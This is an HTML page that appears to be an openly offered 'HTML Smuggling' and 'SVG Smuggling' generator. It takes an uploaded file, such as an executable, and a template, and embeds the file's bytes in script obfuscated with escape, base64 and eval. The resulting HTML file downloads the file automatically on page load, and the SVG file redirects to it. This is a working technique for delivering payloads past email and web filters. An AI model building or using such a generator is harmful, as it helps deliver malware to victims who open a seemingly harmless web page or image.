<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <link rel="shortcut icon"
        href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgc3R5bGU9ImJhY2tncm91bmQ6ICM1NTU7Ij48dGV4dCB4PSI2IiAgeT0iMjUiIGZpbGw9IiM5N2NhMDAiIGZvbnQtc2l6ZT0iMzIiIGZvbnQtZmFtaWx5PSJtb25vc3BhY2UiIGZvbnQtd2VpZ2h0PSJib2xkIj5TPC90ZXh0Pjwvc3ZnPg=="
        type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>HTML Smuggling</title>
</head>

<body>
    <a href="https://github.com/knightyun/html-smuggling" style="
        position: fixed;
        top: 30px;
        right: -40px;
        padding: 5px 50px;
        width: 78px;
        height: 20px;
        background: lightgray;
        transform: rotate(45deg);
        box-shadow: 0 0 5px 0px #333;
    " target="_blank">
        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB3aWR0aD0iNzgiIGhlaWdodD0iMjAiIHJvbGU9ImltZyIgYXJpYS1sYWJlbD0ibGljZW5zZTogTUlUIj48dGl0bGU+bGljZW5zZTogTUlUPC90aXRsZT48bGluZWFyR3JhZGllbnQgaWQ9InMiIHgyPSIwIiB5Mj0iMTAwJSI+PHN0b3Agb2Zmc2V0PSIwIiBzdG9wLWNvbG9yPSIjYmJiIiBzdG9wLW9wYWNpdHk9Ii4xIi8+PHN0b3Agb2Zmc2V0PSIxIiBzdG9wLW9wYWNpdHk9Ii4xIi8+PC9saW5lYXJHcmFkaWVudD48Y2xpcFBhdGggaWQ9InIiPjxyZWN0IHdpZHRoPSI3OCIgaGVpZ2h0PSIyMCIgcng9IjMiIGZpbGw9IiNmZmYiLz48L2NsaXBQYXRoPjxnIGNsaXAtcGF0aD0idXJsKCNyKSI+PHJlY3Qgd2lkdGg9IjQ3IiBoZWlnaHQ9IjIwIiBmaWxsPSIjNTU1Ii8+PHJlY3QgeD0iNDciIHdpZHRoPSIzMSIgaGVpZ2h0PSIyMCIgZmlsbD0iIzk3Y2EwMCIvPjxyZWN0IHdpZHRoPSI3OCIgaGVpZ2h0PSIyMCIgZmlsbD0idXJsKCNzKSIvPjwvZz48ZyBmaWxsPSIjZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LWZhbWlseT0iVmVyZGFuYSxHZW5ldmEsRGVqYVZ1IFNhbnMsc2Fucy1zZXJpZiIgdGV4dC1yZW5kZXJpbmc9Imdlb21ldHJpY1ByZWNpc2lvbiIgZm9udC1zaXplPSIxMTAiPjx0ZXh0IGFyaWEtaGlkZGVuPSJ0cnVlIiB4PSIyNDUiIHk9IjE1MCIgZmlsbD0iIzAxMDEwMSIgZmlsbC1vcGFjaXR5PSIuMyIgdHJhbnNmb3JtPSJzY2FsZSguMSkiIHRleHRMZW5ndGg9IjM3MCI+bGljZW5zZTwvdGV4dD48dGV4dCB4PSIyNDUiIHk9IjE0MCIgdHJhbnNmb3JtPSJzY2FsZSguMSkiIGZpbGw9IiNmZmYiIHRleHRMZW5ndGg9IjM3MCI+bGljZW5zZTwvdGV4dD48dGV4dCBhcmlhLWhpZGRlbj0idHJ1ZSIgeD0iNjE1IiB5PSIxNTAiIGZpbGw9IiMwMTAxMDEiIGZpbGwtb3BhY2l0eT0iLjMiIHRyYW5zZm9ybT0ic2NhbGUoLjEpIiB0ZXh0TGVuZ3RoPSIyMTAiPk1JVDwvdGV4dD48dGV4dCB4PSI2MTUiIHk9IjE0MCIgdHJhbnNmb3JtPSJzY2FsZSguMSkiIGZpbGw9IiNmZmYiIHRleHRMZW5ndGg9IjIxMCI+TUlUPC90ZXh0PjwvZz48L3N2Zz4=" alt="">
    </a>

    <fieldset>
        <legend><b>HTML Smuggling</b></legend>
        <form id="html-smuggle" onsubmit="return genHtml(this)">
            <p>
                Select the file to embed (exe, zip etc.):
                <input type="file" name="file" />
            </p>
            <p>
                Select the html template file ( .html ):
                <input type="file" name="html" />
            </p>
            <p>
                <input type="submit" value="Generate HTML file" />
            </p>
        </form>
    </fieldset>

    <br />
    <br />

    <fieldset>
        <legend><b>SVG Smuggling</b></legend>
        <form id="svg-smuggle" onsubmit="return genSvg(this)">
            <p>
                Select the file to embed (exe, zip etc.):
                <input type="file" name="file" />
            </p>
            <p>
                Select the svg template file ( .svg ):
                <input type="file" name="svg" />
            </p>
            <p>
                <input type="submit" value="Generate SVG file" />
            </p>
        </form>
    </fieldset>

    <script>
        function download(url, name) {
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            a.download = name;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }

        function getHtmlString(arrStr, name, type, template) {
            const jsStr = `
            function download(url, name) {
                const a = document.createElement('a');
                a.style.display = 'none';
                a.href = url;
                a.download = name;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
            }

            document.addEventListener('DOMContentLoaded', function () {
                var arrStr = '${arrStr}';
                var name = '${name}';
                var type = '${type}';

                var arr = arrStr.split('-').map(function (i) { return parseInt(i) });
                var file = new File([new Uint8Array(arr).buffer], name, {
                    type: type,
                });

                var url = URL.createObjectURL(file);
                download(url, name);
                URL.revokeObjectURL(url);
            });`;

            const html = new DOMParser().parseFromString(template, 'text/html');
            const s = document.createElement('script');
            const b64 = btoa(`eval(unescape("${escape(jsStr.replace(/(\s)+/g, '$1'))}"));`);
            s.src = `data:application/javascript;base64,${b64}`;
            html.body.appendChild(s);

            return html.documentElement.outerHTML;
        }

        function getSvgString(arrStr, name, type, template) {
            const jsStr = `
            var arrStr = '${arrStr}';
            var name = '${name}';
            var type = '${type}';

            var arr = arrStr.split('-').map(function (i) { return parseInt(i) });
            var file = new File([new Uint8Array(arr).buffer], name, {
                type: type,
            });

            var url = URL.createObjectURL(file);
            location.href = url;
            URL.revokeObjectURL(url);`;

            const svg = new DOMParser().parseFromString(template, "text/xml");
            const s = svg.createElement('script');
            const b64 = btoa(escape(jsStr.replace(/(\s)+/g, '$1')));

            svg.documentElement.appendChild(s);
            s.outerHTML = `<script type="text/javascript"><![CDATA[eval(unescape(atob("${b64}")));]]><\/script>`;

            return svg.documentElement.outerHTML;
        }


        function genHtml(form) {
            const formData = new FormData(form);

            /** @type {File} */
            const file = formData.get('file');
            const name = file.name;
            const type = file.type;
            /** @type {File} */
            const htmlTemplate = formData.get('html');

            if (!name) {
                alert('Please upload file first !');
                return;
            } else if (!htmlTemplate.name) {
                alert('Please upload html template !');
                return;
            }

            htmlTemplate.text().then(template => {
                file.arrayBuffer().then((data) => {
                    const arrStr = new Uint8Array(data).toString().replace(/,/g, '-');
                    const html = getHtmlString(arrStr, name, type, template);

                    download(`data:text/html,${encodeURIComponent(html)}`, 'html.html');
                });
            });

            return false;
        }

        function genSvg(form) {
            const formData = new FormData(form);

            /** @type {File} */
            const file = formData.get('file');
            const name = file.name;
            const type = file.type;
            /** @type {File} */
            const svgTemplate = formData.get('svg');

            if (!name) {
                alert('Please upload file first !');
                return;
            } else if (!svgTemplate.name) {
                alert('Please upload svg template !');
                return;
            }

            svgTemplate.text().then(template => {
                file.arrayBuffer().then((data) => {
                    const arrStr = new Uint8Array(data).toString().replace(/,/g, '-');
                    const svg = getSvgString(arrStr, name, type, template);

                    download(`data:image/svg+xml,${encodeURIComponent(svg)}`, 'svg.svg', type);
                });
            });

            return false;
        }
    </script>
</body>

</html>